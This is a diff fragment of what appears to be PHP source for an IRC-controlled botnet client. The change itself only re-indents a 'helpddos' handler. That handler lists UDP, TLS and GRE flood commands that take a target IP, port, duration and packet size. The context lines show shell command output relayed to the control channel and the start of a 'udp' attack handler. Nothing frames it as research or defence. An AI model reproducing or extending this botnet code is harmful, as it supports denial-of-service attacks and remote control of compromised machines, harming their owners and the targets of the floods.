@@ -282,16 +282,16 @@ class sell
                                         $ret = explode("\n", $exec);
                                         for ($i = 0;$i < count($ret);$i++) if ($ret[$i] != NULL) $this->privmsg($this->config['chan'], " : " . trim($ret[$i]));
                                         break;
-case "helpddos":
-$this->privmsg($this->config['chan'], "[\2===================\2]");
-$this->privmsg($this->config['chan'], "[\2=====CmD DDOS!=====\2]");
-$this->privmsg($this->config['chan'], "[\2-udp IP PORTA SECONDI !\2]");
-$this->privmsg($this->config['chan'], "[\2-udptls IP PORTA SECONDI!\2]");
-$this->privmsg($this->config['chan'], "[\2-udpstd IP PORTA SECONDI!\2]");
-$this->privmsg($this->config['chan'], "[\2-udpflood IP PORTA SECONDI PACKETSIZE!\2]");
-$this->privmsg($this->config['chan'], "[\2-greflood IP PORTA SECONDI PACKETSIZE!\2]");
-$this->privmsg($this->config['chan'], "[\2-die Quit BOT\2]");
-break;
+                                    case "helpddos":
+                                        $this->privmsg($this->config['chan'], "[\2===================\2]");
+                                        $this->privmsg($this->config['chan'], "[\2=====CmD DDOS!=====\2]");
+                                        $this->privmsg($this->config['chan'], "[\2-udp IP PORTA SECONDI !\2]");
+                                        $this->privmsg($this->config['chan'], "[\2-udptls IP PORTA SECONDI!\2]");
+                                        $this->privmsg($this->config['chan'], "[\2-udpstd IP PORTA SECONDI!\2]");
+                                        $this->privmsg($this->config['chan'], "[\2-udpflood IP PORTA SECONDI PACKETSIZE!\2]");
+                                        $this->privmsg($this->config['chan'], "[\2-greflood IP PORTA SECONDI PACKETSIZE!\2]");
+                                        $this->privmsg($this->config['chan'], "[\2-die Quit BOT\2]");
+                                        break;
                                     case "udp":
                                         if (count($mcmd) > 3)
                                         {
